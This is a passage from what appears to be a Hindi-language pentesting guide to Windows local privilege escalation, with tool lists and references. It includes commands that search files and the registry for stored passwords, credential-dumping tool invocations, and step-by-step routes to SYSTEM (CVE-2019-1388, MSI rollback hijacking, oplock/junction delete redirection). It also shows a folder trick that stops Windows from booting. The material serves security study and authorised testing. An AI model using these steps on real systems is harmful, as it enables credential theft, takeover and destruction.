reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र्स का इतिहास

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome या Firefox** के पासवर्ड स्टोर किए जाते हैं।\
ब्राउज़र के इतिहास, बुकमार्क और पसंदीदा (favourites) भी जांचें क्योंकि शायद कुछ **पासवर्ड** वहाँ स्टोर हों।

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows ऑपरेटिंग सिस्टम में बनी एक तकनीक है जो विभिन्न भाषाओं के सॉफ़्टवेयर कंपोनेंट्स के बीच आपस में संचार (intercommunication) की अनुमति देती है। प्रत्येक COM component को **identified via a class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality प्रदर्शित करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को मर्ज करके बनाई जाती है = **HKEY\CLASSES\ROOT.**

इस registry के CLSIDs के अंदर आप child registry **InProcServer32** पाएँगे जिसमें एक **default value** होती है जो एक **DLL** की ओर इशारा करती है और एक value होती है जिसका नाम **ThreadingModel** होता है जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) या **Neutral** (Thread Neutral) हो सकती है।

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

जानने के लिए कि attackers COM Hijacking को persistence mechanism के रूप में कैसे उपयोग करते हैं, देखें:

{{#ref}}
com-hijacking.md
{{#endref}}

### **फाइलों और रजिस्ट्री में सामान्य पासवर्ड खोज**

**फाइल की सामग्री खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशेष फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में कुंजी नाम और पासवर्ड खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Passwords खोजने वाले उपकरण

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin। मैंने यह plugin बनाया है ताकि यह **automatically execute every metasploit POST module that searches for credentials** लक्षित सिस्टम के अंदर चला सके।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस पेज में बताए गए उन सभी फाइलों को स्वचालित रूप से खोजता है जिनमें passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) सिस्टम से password निकालने के लिए एक और बढ़िया टूल है।

यह टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई टूल्स के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process communication और data transfer को सक्षम करते हैं।

Windows एक फीचर प्रदान करता है जिसे **Named Pipes** कहा जाता है, जो unrelated processes को डेटा share करने की अनुमति देता है, यहाँ तक कि अलग नेटवर्क्स पर भी। यह client/server आर्किटेक्चर जैसा दिखता है, जिसमें भूमिकाएँ **named pipe server** और **named pipe client** के रूप में परिभाषित होती हैं।

जब कोई **client** pipe के द्वारा डेटा भेजता है, तो pipe सेट करने वाला **server** उस **client** की identity अपना सकता है, बशर्ते उसके पास आवश्यक **SeImpersonate** rights हों। किसी ऐसे **privileged process** की पहचान करना जो आपकी pipe के माध्यम से communicate करता है और जिसे आप mimic कर सकते हैं, तब आपको उस process की identity अपनाकर **higher privileges** हासिल करने का मौका देता है जब वह आपकी बनाई pipe के साथ interact करे। ऐसे हमले को क्रियान्वित करने के निर्देशों के लिए उपयोगी गाइड [**here**](named-pipe-client-impersonation.md) और [**here**](#from-high-integrity-to-system) पर मिलते हैं।

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### Windows में execute कर सकने वाले File Extensions

इस पेज को देखें **[https://filesec.io/](https://filesec.io/)**

### **पासवर्ड के लिए Command Lines की निगरानी**

जब user के रूप में shell मिलता है, तो scheduled tasks या अन्य processes हो सकते हैं जो **credentials को command line पर पास करते हैं**। नीचे दिया गया script हर दो सेकंड में process के command lines को capture करता है और वर्तमान स्थिति की तुलना पिछली स्थिति से करता है, तथा किसी भी अंतर को output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रोसेस से पासवर्ड चुराना

## कम-प्रिविलेज उपयोगकर्ता से NT\AUTHORITY SYSTEM (CVE-2019-1388) तक / UAC Bypass

यदि आपके पास ग्राफिकल इंटरफ़ेस (console या RDP के माध्यम से) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में किसी कम-प्रिविलेज उपयोगकर्ता से एक टर्मिनल या कोई अन्य process जैसे "NT\AUTHORITY SYSTEM" चलाना संभव है।

यह एक ही vulnerability के साथ privileges escalate करने और UAC bypass करने की अनुमति देता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं है और प्रक्रिया के दौरान उपयोग किया गया binary Microsoft द्वारा signed और issued है।

प्रभावित सिस्टमों में कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित चरणों को पूरा करना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## व्यवस्थापक Medium से High Integrity Level तक / UAC Bypass

इसे पढ़ें ताकि आप **Integrity Levels के बारे में जान सकें**:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **इसे पढ़ें ताकि आप UAC और UAC bypasses के बारे में जान सकें:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह हमला मूल रूप से Windows Installer की rollback विशेषता का दुरुपयोग करके मान्य फाइलों को अनइंस्टॉलेशन प्रक्रिया के दौरान खराब फाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना होगा जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए उपयोग किया जाएगा, जिसे बाद में Windows Installer अन्य MSI पैकेजों के अनइंस्टॉलेशन के दौरान rollback फाइलें स्टोर करने के लिए उपयोग करेगा जहाँ rollback फाइलों को malicious payload रखने के लिए संशोधित किया गया होगा।

सारांशित तकनीक निम्नानुसार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- एक `.msi` बनाएं जो एक harmless फ़ाइल (जैसे, `dummy.txt`) किसी writable फ़ोल्डर (`TARGETDIR`) में इंस्टॉल करे।
- इंस्टॉलर को **"UAC Compliant"** के रूप में मार्क करें, ताकि एक **non-admin user** इसे चला सके।
- इंस्टॉल के बाद फ़ाइल पर एक **handle** खुला रखें।

- Step 2: Begin Uninstall
- उसी `.msi` को uninstall करें।
- uninstall प्रक्रिया फ़ाइलों को `C:\Config.Msi` में मूव करना शुरू कर देती है और उन्हें `.rbf` फ़ाइलों में rename करती है (rollback backups)।
- detect करने के लिए **open file handle** को `GetFinalPathNameByHandle` से poll करें कि कब फ़ाइल `C:\Config.Msi\<random>.rbf` बन जाती है।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है जो:
- यह संकेत देता है कि `.rbf` लिखा जा चुका है।
- फिर uninstall जारी रखने से पहले किसी अन्य event पर **wait** करता है।

- Step 4: Block Deletion of `.rbf`
- संकेत मिलने पर, `.rbf` फ़ाइल को `FILE_SHARE_DELETE` के बिना खोलें — यह इसे delete होने से **रोकता** है।
- फिर uninstall के समाप्त होने के लिए **signal back** करें।
- Windows Installer `.rbf` को delete करने में असफल रहता है, और क्योंकि यह सभी contents को delete नहीं कर पाता, **`C:\Config.Msi` हटाया नहीं जाता**।

- Step 5: Manually Delete `.rbf`
- आप (attacker) `.rbf` फ़ाइल को मैन्युअली डिलीट करते हैं।
- अब **`C:\Config.Msi` खाली है**, hijack करने के लिए तैयार।

> इस बिंदु पर, **SYSTEM-level arbitrary folder delete vulnerability** को trigger करें ताकि `C:\Config.Msi` delete हो जाए।

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- खुद `C:\Config.Msi` फ़ोल्डर को पुनः बनाएं।
- कमजोर DACLs सेट करें (उदा., Everyone:F), और `WRITE_DAC` के साथ एक handle खुला रखें।

- Step 7: Run Another Install
- `.msi` को फिर से इंस्टॉल करें, जिसमें:
- `TARGETDIR`: Writable location.
- `ERROROUT`: एक variable जो forced failure को trigger करता है।
- यह install फिर से **rollback** को ट्रिगर करने के लिए उपयोग किया जाएगा, जो `.rbs` और `.rbf` को पढ़ता है।

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` को monitor करें जब तक कि एक नई `.rbs` दिखाई न दे।
- इसकी फ़ाइल नाम कैप्चर करें।

- Step 9: Sync Before Rollback
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** है जो:
- जब `.rbs` बनाई जाती है तो एक event signal करता है।
- फिर आगे बढ़ने से पहले **wait** करता है।

- Step 10: Reapply Weak ACL
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर फिर से strong ACLs लागू कर देता है।
- लेकिन चूँकि आपके पास अभी भी `WRITE_DAC` के साथ एक handle है, आप फिर से कमजोर ACLs **reapply** कर सकते हैं।

> ACL केवल handle open पर लागू होते हैं, इसलिए आप अभी भी folder में लिख सकते हैं।

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` फ़ाइल को एक **fake rollback script** से overwrite करें जो Windows को बताता है कि:
- आपकी `.rbf` फ़ाइल (malicious DLL) को एक **privileged location** (उदा., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) में restore किया जाए।
- आपकी fake `.rbf` छोड़ें जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Trigger the Rollback
- sync event को signal करें ताकि installer resume कर सके।
- एक **type 19 custom action (`ErrorOut`)**नीति के तहत install को जानबूझकर एक ज्ञात पॉइंट पर fail करने के लिए configure किया गया है।
- इससे **rollback शुरू हो जाता है**।

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- आपकी malicious `.rbs` पढ़ता है।
- आपकी `.rbf` DLL को target location में copy कर देता है।
- अब आपके पास एक **malicious DLL SYSTEM-loaded path में** है।

- Final Step: Execute SYSTEM Code
- एक भरोसेमंद **auto-elevated binary** (उदा., `osk.exe`) चलाएँ जो उस DLL को लोड करता है जिसे आपने hijack किया।
- **Boom**: आपका कोड **SYSTEM** के रूप में execute होता है।

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

मुख्य MSI rollback technique (पिछली तकनीक) यह मानती है कि आप एक **पूरे फोल्डर** (उदा., `C:\Config.Msi`) को delete कर सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है तो क्या होगा?

आप NTFS internals का दुरुपयोग कर सकते हैं: हर फ़ोल्डर में एक hidden alternate data stream होता है जिसे कहा जाता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर के **इंडेक्स मेटाडेटा** को स्टोर करता है।

तो, अगर आप किसी फ़ोल्डर के **`::$INDEX_ALLOCATION` stream को हटाते हैं**, NTFS फ़ाइल सिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप यह काम standard file deletion APIs का उपयोग करके कर सकते हैं:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप एक *file* delete API कॉल कर रहे हों, यह **फ़ोल्डर को ही डिलीट कर देता है**।

### From Folder Contents Delete to SYSTEM EoP
अगर आपका primitive आपको arbitrary files/folders को हटाने की अनुमति नहीं देता, पर यह **attacker-controlled folder के *contents* को हटाने की अनुमति देता है** तो क्या होगा?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- यह oplock उस समय **execution रोक देता है** जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया को ट्रिगर करें (उदाहरण: `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों (जैसे कि `%TEMP%`) को स्कैन करती है और उनकी सामग्री को हटाने का प्रयास करती है।
- जब यह `file1.txt` तक पहुँचती है, तो **oplock ट्रिगर होता है** और नियंत्रण आपके callback को सौंप देता है।

4. चरण 4: oplock callback के अंदर — हटाने को पुनर्निर्देशित करें

- विकल्प A: `file1.txt` को कहीं और स्थानांतरित करें
- यह `folder1` को बिना oplock तोड़े खाली कर देता है।
- `file1.txt` को सीधे न हटाएँ — इससे oplock समयपूर्वक मुक्त हो जाएगा।

- विकल्प B: `folder1` को **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS की आंतरिक स्ट्रीम को निशाना बनाता है जो फ़ोल्डर मेटाडेटा को स्टोर करती है — इसे डिलीट करने से फ़ोल्डर डिलीट हो जाता है।

5. चरण 5: oplock जारी करें
- SYSTEM प्रक्रिया जारी रहती है और `file1.txt` को डिलीट करने की कोशिश करती है।
- लेकिन अब, junction + symlink की वजह से, यह वास्तव में डिलीट कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटाया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

एक primitive का फायदा उठाएँ जो आपको **create an arbitrary folder as SYSTEM/admin** करने देता है — भले ही आप **you can’t write files** या **set weak permissions** कर न सकें।

एक **folder** (not a file) बनाएं और उसे किसी **critical Windows driver** के नाम से रखें, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode ड्राइवर के अनुरूप होता है.
- यदि आप इसे **फ़ोल्डर के रूप में पहले से बनाते हैं**, तो Windows बूट पर वास्तविक ड्राइवर को लोड करने में विफल रहता है.
- फिर, Windows बूट के दौरान `cng.sys` लोड करने की कोशिश करता है.
- यह फ़ोल्डर देखता है, **वास्तविक ड्राइवर को resolve करने में विफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**.
- बाहरी हस्तक्षेप (उदा., boot repair या disk access) के बिना **कोई fallback नहीं**, और **कोई recovery नहीं**.


## **High Integrity से SYSTEM तक**

### **नई सर्विस**

यदि आप पहले से ही किसी High Integrity प्रोसेस पर चल रहे हैं, तो **SYSTEM तक रास्ता** बस एक नई सर्विस **बनाकर और उसे चलाकर** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि यह एक वैध service है या binary आवश्यकता के अनुसार कार्य बहुत जल्दी करता हो, क्योंकि यदि यह वैध service नहीं है तो इसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप कोशिश कर सकते हैं कि **AlwaysInstallElevated registry entries को enable करें** और एक reverse shell को _**.msi**_ wrapper का उपयोग करके **install** करें।\
[registry keys और _.msi_ package कैसे install करनी है उसके बारे में अधिक जानकारी यहाँ।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**find the code here**](seimpersonate-from-high-to-system.md)**।**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास ये token privileges हैं (बहुत संभवतः आप इसे एक पहले से मौजूद High Integrity process में पाएंगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (protected processes को छोड़कर) को **open** कर सकेंगे, उस process का **token copy** कर सकेंगे, और उस token के साथ एक **arbitrary process create** कर सकेंगे।\
इस technique में आमतौर पर **SYSTEM के रूप में चल रहे किसी भी process को चुना जाता है जिसमें सभी token privileges हों** (_हाँ, आप SYSTEM processes पा सकते हैं जिनमें सभी token privileges नहीं होते_)।\
**आप एक** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)** पा सकते हैं।**

### **Named Pipes**

यह technique meterpreter द्वारा `getsystem` में escalate करने के लिए इस्तेमाल की जाती है। यह technique इस पर आधारित है कि **एक pipe बनाया जाए और फिर एक service को बनाया/abuse किया जाए ताकि वह pipe पर लिख सके**। फिर, वह **server** जिसने pipe बनाया था और जिसके पास **`SeImpersonate`** privilege है, वह pipe client (service) के token को **impersonate** कर पाएगा और SYSTEM privileges प्राप्त कर लेगा।\
यदि आप [**name pipes के बारे में और जानना चाहते हैं तो यह पढ़ें**](#named-pipe-client-impersonation)।\
यदि आप example पढ़ना चाहते हैं कि [**कैसे high integrity से System तक name pipes का उपयोग करके जाएँ**](from-high-integrity-to-system-with-name-pipes.md) तो यह पढ़ें।

### Dll Hijacking

यदि आप किसी ऐसी dll को **hijack** करने में सफल होते हैं जिसे **SYSTEM के रूप में चल रहे किसी process द्वारा load किया जा रहा हो**, तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह की privilege escalation के लिए भी उपयोगी है, और ऊपर से यह high integrity process से मिलने में **काफी आसान** है क्योंकि उसे dlls load करने के लिए उपयोग होने वाले folders पर **write permissions** मिल सकते हैं।\
**आप** [**Dll hijacking के बारे में और जान सकते हैं यहाँ**](dll-hijacking/index.html)**।**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## अधिक मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी टूल्स

**Windows local privilege escalation vectors देखने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच के लिए (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)। Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी इकट्ठा करने के लिए (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। local में -Thorough इस्तेमाल करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials extract करता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठे किए गए passwords को domain पर spray करने के लिए**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात privesc vulnerabilities के लिए खोज (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- local checks **(Admin rights की आवश्यकता)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities के लिए खोज (VisualStudio का उपयोग करके compile करने की आवश्यकता) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations की खोज के लिए host को enumerate करता है (zyaada gather info tool; needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- बहुत सारे softwares से credentials extract करता है (github पर precompiled exe है)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- misconfiguration की जाँच (executable github पर precompiled)। सिफारिश नहीं की जाती। यह Win10 पर अच्छी तरह काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe)। सिफारिश नहीं की जाती। यह Win10 पर अच्छी तरह काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- यह पोस्ट के आधार पर बनाया गया टूल है (इसे ठीक से काम करने के लिए accesschk की आवश्यकता नहीं होती पर यह इसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के output को पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के output को पढ़ता है और काम करने वाले exploits सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

प्रोजेक्ट को सही संस्करण के .NET का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). शिकार (victim) host पर इंस्टॉल .NET वर्शन देखने के लिए आप यह कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
